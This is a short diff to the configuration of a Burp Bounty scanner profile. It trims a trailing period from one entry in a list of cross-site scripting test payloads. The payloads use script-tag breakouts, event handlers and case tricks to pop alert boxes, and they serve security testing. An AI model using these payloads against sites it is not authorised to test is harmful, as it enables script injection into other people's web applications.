@@ -7,7 +7,7 @@
     "Author": "@burpbounty",
     "Payloads": [
       "true,\u003c/script\u003e\u003cscript\u003econfirm(1)\u003c/script\u003e",
-      "true,\"\u003e\u003cimg src\u003dx onerror\u003dprompt(1);\u003e.",
+      "true,\"\u003e\u003cimg src\u003dx onerror\u003dprompt(1);\u003e",
       "true,\u003csvg/oNLoAd\u003dalert(1)\u003e",
       "true,\u003cmarquee loop\u003d1 width\u003d0 onfinish\u003dalert(2)\u003e",
       "true,\"\u003e\u003cScriPT\u003ea\u003d/XSS/.alert(a.source)\u003c/ScriPT\u003e",
